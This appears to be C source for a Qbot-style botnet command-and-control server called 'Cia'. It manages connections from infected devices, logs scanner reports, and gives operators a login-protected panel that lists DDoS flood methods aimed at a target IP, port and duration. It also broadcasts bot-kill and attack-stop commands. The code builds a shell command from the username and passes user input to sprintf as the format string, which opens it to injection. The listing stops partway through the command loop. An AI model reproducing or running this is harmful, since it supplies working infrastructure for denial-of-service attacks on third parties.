/*Cia Qbot Developed By Gcezp 
- Has A working API System
- Preset Methods and Arguments
- Honeypot Detection
- Logs Ips, Client Connections, And Monitors the C2
- Ban And Unban Ips From The C2

- C2 Desgin Inspired By Erradic/Vivid.py's Cloak*/ 
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

int adminstatus;

struct login_info {
	char username[200];
	char password[200];
	char type[200];
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
        char build[7];
		char arch[30];
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    char ip[16];
    int adminstatus;
	int API;
	int Reg;
	char nickname[20];
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
struct telnetListenerArgs {
	int sock;
	uint32_t ip;
};

FILE *LogFile2;
FILE *LogFile3;


static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile FILE *ticket;
static volatile FILE *staff;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
const char *get_host(uint32_t addr)
{
	struct in_addr in_addr_ip;
	in_addr_ip.s_addr = addr;
	return inet_ntoa(in_addr_ip);
}

void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;31m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
					}
				}
			}
		}
	}
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
void *TitleWriter(void *sock) 
{
	int datafd = (int)sock;
    char string[2048];
    while(1) 
    {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; Devices: %d | Agents Online: %d %c", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(3);
		}
}		        
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *arguments, void *sock)
{ 
	struct telnetListenerArgs *args = arguments;
    char username[80];
    int datafd = (int)args->sock;
    const char *management_ip = get_host(args->ip);
    //printf("%s\n", management_ip);  
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* usernames;
	char* passwords;
	char botnet[2048];
	char botcount [2048];
	char statuscount [2048];

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s", accounts[j].username, accounts[j].password, accounts[j].type);
		++j;
	}

    char login[25][1024];
    char string[2048];
    sprintf(string, "%c]0; Cia Login %c", '\033', '\007');
    if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
    sprintf(login[1],  "\e[1;34mWelcome To The \e[1;97mCIA V2 Server \e[1;34mSide\e[0m\r\n");
    sprintf(login[2],  "\e[1;97mPlease Enter Your Login \e[1;34mCredentials\e[0m\r\n"); 
    sprintf(login[3],  "\e[1;34m\e[0m\r\n");

	int h;
	for(h =0;h<21;h++)
	if(send(datafd, login[h], strlen(login[h]), MSG_NOSIGNAL) == -1) goto end;
	char clearscreen [2048];
	memset(clearscreen, 0, 2048);
	sprintf(clearscreen, "\033[1A");
	char user [5000];	
	
    sprintf(user, "\e[1;97mUsername\e[1;34m:\e[1;97m ");
	
	if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
    trim(buf);
	char* nickstring;
	sprintf(accounts[find_line].username, buf);
    nickstring = ("%s", buf);
    find_line = Find_Login(nickstring);
    if(strcmp(nickstring, accounts[find_line].username) == 0){
	char password [5000];
    sprintf(password, "\e[1;97mPassword\e[1;34m:\e[0;30m ", accounts[find_line].password);
	if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
	
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

    trim(buf);
    if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);
	goto Banner;
    }
     failed:
    if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
    char *kkkkkkk = "\x1b[31mError, Incorrect Login Credentials. Your Ip Has Been Logged!\x1b[0m\r\n";
    if(send(datafd, kkkkkkk, strlen(kkkkkkk), MSG_NOSIGNAL) == -1) goto end;
    FILE *logFile;
    logFile = fopen("/root/Logs/failed_attempts.log", "a");
    fprintf(logFile, "Failed Login Attempt (%s)\n", management_ip);
    printf("\x1b[1;31mFailed Login Attempt \x1b[1;36m(\x1b[1;31m%s\x1b[1;36m)\n", management_ip);
    fclose(logFile);
    //broadcast(buf, datafd, usernamez, 0, MAXFDS, datafd);
    memset(buf, 0, 2048);
    sleep(5);
    goto end;
	Banner:

	pthread_create(&title, NULL, &TitleWriter, datafd);
	char ascii_banner_line0   [5000];
	char ascii_banner_linem   [5000];
	char ascii_banner_line1   [5000];
    char ascii_banner_line2   [5000];
    char ascii_banner_line3   [5000];
    char ascii_banner_line4   [5000];
    char ascii_banner_line5   [5000];
    char ascii_banner_line6   [5000];
    char ascii_banner_line7   [5000];
    char ascii_banner_line8   [5000];
    char ascii_banner_line9   [5000];
	char ascii_banner_lineq   [5000];
	char ascii_banner_linel   [5000];
    char *hahalaughnow[60];
    char *userlog  [800];

    sprintf(managements[datafd].nickname, "%s", accounts[find_line].username);
    sprintf(hahalaughnow, "echo '%s Has Logged In | Ip: %s' >> /root/Logs/client_connections.log", accounts[find_line].username, management_ip);
    system(hahalaughnow);
    if(!strcmp(accounts[find_line].type, "admin")){
        managements[datafd].adminstatus = 1;
        broadcast(buf, datafd, accounts[find_line].username);
        printf("\x1b[1;97mUser \x1b[1;34m%s \x1b[1;97mHas Logged In \x1b[1;34m| \x1b[1;97mAccount Type\x1b[1;34m:\x1b[1;97m Admin\x1b[1;34m |\x1b[1;97m Users Ip\x1b[1;34m:\x1b[1;97m %s \x1b[0m\n", accounts[find_line].username, management_ip);
	}
		if(!strcmp(accounts[find_line].type, "Reg")){
        managements[datafd].Reg = 1;
        broadcast(buf, datafd, accounts[find_line].username);
        printf("\x1b[1;97mUser \x1b[1;34m%s \x1b[1;97mHas Logged In \x1b[1;34m| \x1b[1;97mAccount Type\x1b[1;34m:\x1b[1;97m Regular\x1b[1;34m |\x1b[1;97m Users Ip\x1b[1;34m:\x1b[1;97m %s \x1b[0m\n", accounts[find_line].username, management_ip);
    }
	if(!strcmp(accounts[find_line].type, "API")){		
        managements[datafd].API = 1;
        broadcast(buf, datafd, accounts[find_line].username);
        printf("\x1b[1;97mAttack Sent Using The \x1b[1;34mAPI\x1b[0m\n");
    }

    sprintf(ascii_banner_line0,   "\e[0m\033[2J\033[1;1H");	
    sprintf(ascii_banner_linem,  "\e[1;34m             ╔════════════════════════════════════════════════╗           \e[0m\r\n");  
    sprintf(ascii_banner_line1,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║             \e[0m\r\n");
    sprintf(ascii_banner_line2,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢛⣩⣴⡶⢊⡉⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║             \e[0m\r\n");
    sprintf(ascii_banner_line3,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⣿⡿⠃⣴⣿⣿⢸⣿⣿⣿⠟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║             \e[0m\r\n");
    sprintf(ascii_banner_line4,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⢠⣿⣿⣿⡇⢸⣿⣿⢃⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║             \e[0m\r\n");
    sprintf(ascii_banner_line5,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢀⣿⣿⣿⣿⣷⣮⣭⣴⣿⣿⣿⣿⠟⣿⣿⣿⠟⣋⣍⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║             \e[0m\r\n");
    sprintf(ascii_banner_line6,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣼⣿⡟⢁⣾⡿⡋⢾⣿⡟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║              \e[0m\r\n");
    sprintf(ascii_banner_line7,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⡏⢰⣿⠟⠄⣼⣿⡿⠁⣿⠟⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║              \e[0m\r\n");
    sprintf(ascii_banner_line8,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠙⢿⣿⣿⣿⣿⡿⠟⣡⣾⣿⣦⣴⣾⣧⣌⣩⣴⣦⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║             \e[0m\r\n");
    sprintf(ascii_banner_line9,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣬⣭⣭⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║             \e[0m\r\n");
    sprintf(ascii_banner_lineq,  "\e[1;34m             ║\e[0;97m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[1;34m ║             \e[0m\r\n");
    sprintf(ascii_banner_linel,  "\e[1;34m             ╚════════════════════════════════════════════════╝                            \e[0m\r\n");

    if(send(datafd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_linem, strlen(ascii_banner_linem), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_lineq, strlen(ascii_banner_lineq), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, ascii_banner_linel, strlen(ascii_banner_linel), MSG_NOSIGNAL) == -1) goto end;

		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &TitleWriter, datafd);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, ".INFO") || strstr(buf, ".info") || strstr(buf, ".Info")) {
				char botcount [2048];
				memset(botcount, 0, 2048);
				char statuscount [2048];
				char ops [2048];
				char Type [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[1;34mBots Connected: \e[1;97m%d\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(statuscount, "\e[1;34mUsername: \e[1;97m%s\r\n", accounts[find_line].username);
				sprintf(ops,         "\e[1;34mUsers Online: \e[1;97m%d\r\n", OperatorsConnected, scannerreport);
                if(!strcmp(accounts[find_line].type, "admin")){
                sprintf(Type,"\e[1;34mAccount Type: \e[1;97mADMIN\e[0m\r\n");
		        }
		        else
		        {
                sprintf(Type,"\e[1;34mAccount Type: \e[1;97mRegular User\e[0m\r\n");
				}
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, Type, strlen(Type), MSG_NOSIGNAL) == -1) return;
		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
					if(strstr(buf, ".TOS") || strstr(buf, ".Tos") || strstr(buf, ".tos")) {
				char pz  [800];
				char pm  [800];
				char p2  [800];
				char p3  [800];
				char p4  [800];
				char p6  [800];
				char p8  [800];
                

                sprintf(pm,  "\e[1;34m Username: %s\e[0m\r\n", accounts[find_line].username);
				sprintf(pm,  "\e[1;97m This C2 Is Just For Learning More About Botnets & Malware\e[0m\r\n");
				sprintf(p2,  "\e[1;34m Spamming Attacks And hitting Gov Sites Are Prohibited!\e[0m\r\n");
				sprintf(p3,  "\e[1;97m Login Sharing Is Strictly Prohibited!\e[0m\r\n");
				sprintf(p4,  "\e[1;34m Ip Logging Is Enabled\e[0m\r\n");                                         
				sprintf(p6,  "\e[1;97m Contact The Owner If You Forgot Your Login\e[0m\r\n");                
				sprintf(p8,  "\e[1;34m Breaking Any Rule Results In A Permanent Ban!\e[0m\r\n"); 
			 
				if(send(datafd, pm,  strlen(pm), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;

		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			
			if(strstr(buf, "Help") || strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "?")) {
				char hp2  [800];
				char hp3  [800];
				char hp4  [800];
				char hp5  [800];
				char hpv  [800];
				char hpg  [800];
				char hpn  [800];

				sprintf(hp2,  "\e[1;34m\e[0m\r\n");
				sprintf(hp3,  "\e[1;34m.TOS   \e[1;97mShows The Cia TOS            \e[0m\r\n");
				sprintf(hp4,  "\e[1;34m.DDOS  \e[1;97mShows DDoS Commands            \e[0m\r\n");
				sprintf(hp5,  "\e[1;34m.INFO  \e[1;97mShows Account & Server Info      \e[0m\r\n");
				sprintf(hpv,  "\e[1;34m.ADMN  \e[1;97mShows Admin Commands           \e[0m\r\n");
				sprintf(hpg,  "\e[1;34m.TOOLS \e[1;97mShows Available Tools          \e[0m\r\n");
				sprintf(hpn,  "\e[1;34m\e[0m\r\n");

				if(send(datafd, hp2,  strlen(hp2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp3,  strlen(hp3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hpv,  strlen(hpv), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hpg,  strlen(hpg), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hpn,  strlen(hpn), MSG_NOSIGNAL) == -1) goto end;
				
		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
		
 		if(strstr(buf, ".DDOS") || strstr(buf, ".ddos") || strstr(buf, ".DDoS") || strstr(buf, ".Ddos")) {
				char cpn  [800];
				char cp2  [800];
				char cp4  [800];
				char cp5  [800];
				char cp8  [800];
				char cp9  [800];
				char cp10  [800];
				char cp11  [800];
				char cpt  [800];
				char cpc  [800];

				sprintf(cpn,  "\e[1;31m\r\n");
				sprintf(cp2,  "\e[1;97m    ╔══════════════════════════╗         \e[0m\r\n");
				sprintf(cp4,  "\e[1;97m    ║ \e[1;34m. STD \e[1;97m[\e[1;34mIP\e[1;97m] \e[1;97m[\e[1;34mPORT\e[1;97m] \e[1;97m[\e[1;34mTIME\e[1;97m] \e[1;97m║           \e[0m\r\n");
				sprintf(cp5,  "\e[1;97m    ║ \e[1;34m. UDP \e[1;97m[\e[1;34mIP\e[1;97m] \e[1;97m[\e[1;34mPORT\e[1;97m] \e[1;97m[\e[1;34mTIME\e[1;97m] \e[1;97m║           \e[0m\r\n");
				sprintf(cp8,  "\e[1;97m    ║ \e[1;34m. TCP \e[1;97m[\e[1;34mIP\e[1;97m] \e[1;97m[\e[1;34mPORT\e[1;97m] \e[1;97m[\e[1;34mTIME\e[1;97m] \e[1;97m║           \e[0m\r\n"); 
				sprintf(cp9,  "\e[1;97m    ║ \e[1;34m. VSE \e[1;97m[\e[1;34mIP\e[1;97m] \e[1;97m[\e[1;34mPORT\e[1;97m] \e[1;97m[\e[1;34mTIME\e[1;97m] \e[1;97m║           \e[0m\r\n");
				sprintf(cp10,  "\e[1;97m    ║ \e[1;34m. XMS \e[1;97m[\e[1;34mIP\e[1;97m] \e[1;97m[\e[1;34mPORT\e[1;97m] \e[1;97m[\e[1;34mTIME\e[1;97m] \e[1;97m║           \e[0m\r\n");
				sprintf(cp11,  "\e[1;97m    ║ \e[1;34m. CNC \e[1;97m[\e[1;34mIP\e[1;97m] \e[1;97m[\e[1;34mPORT\e[1;97m] \e[1;97m[\e[1;34mTIME\e[1;97m] \e[1;97m║           \e[0m\r\n");
				sprintf(cpt,  "\e[1;97m    ╚══════════════════════════╝                           \e[0m\r\n");
				sprintf(cpc,  "\e[1;32m\e[0m\r\n");
 
				if(send(datafd, cpn,  strlen(cpn), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp2,  strlen(cp2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp4,  strlen(cp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp5,  strlen(cp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp8,  strlen(cp8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp9,  strlen(cp9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp10,  strlen(cp10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp11,  strlen(cp11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cpt,  strlen(cpt), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cpc,  strlen(cpc), MSG_NOSIGNAL) == -1) goto end;
				
		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
		}
		
 		if(strstr(buf, ".Tools") || strstr(buf, ".TOOLS") || strstr(buf, ".tools")) {
				char cp1  [800];
				char cp3  [800];
				char cp4  [800];
				char cp7  [800];

				sprintf(cp1,  "\e[1;34m\e[0m\r\n");         
				sprintf(cp3,  "\e[1;34m.IPLOOKUP \e[0;97mGeolocates An Ip Address  \e[0m\r\n");
				sprintf(cp4,  "\e[1;34m.PORTSCAN \e[0;97mPortscans An Ip Address   \e[0m\r\n");
				sprintf(cp7,  "\e[1;34m\e[0m\r\n");
				
				if(send(datafd, cp1,  strlen(cp1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp3,  strlen(cp3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp4,  strlen(cp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp7,  strlen(cp7), MSG_NOSIGNAL) == -1) goto end;
				
		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}		
		if(strstr(buf, ".ADMN") || strstr(buf, ".admn") || strstr(buf, ".Admn")) {
				char cp1  [800];
				char cp3  [800];
				char cp4  [800];
				char cp7  [800];

				sprintf(cp1,  "\e[1;34m\e[0m\r\n");         
				sprintf(cp3,  "\e[1;34m.BANIP   \e[1;97mBans A Ip Address From The C2  \e[0m\r\n");
				sprintf(cp4,  "\e[1;34m.UNBANIP \e[1;97mUnbans A Ip Address From The C2   \e[0m\r\n");
				sprintf(cp7,  "\e[1;34m\e[0m\r\n");
				
				if(send(datafd, cp1,  strlen(cp1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp3,  strlen(cp3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp4,  strlen(cp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cp7,  strlen(cp7), MSG_NOSIGNAL) == -1) goto end;
				
		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if(strstr(buf, "!* BOTKILL123")) {
				char gtfomynet [2048];
				memset(gtfomynet, 0, 2048);
				sprintf(gtfomynet, "!* BOTKILL123\r\n");
				broadcast(buf, datafd, gtfomynet);
				continue;
			}
			if(strstr(buf, "!* KILLATTK"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[97m[\e[0;91mCIA\e[97m] \e[31mATTACKS STOPPED\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}

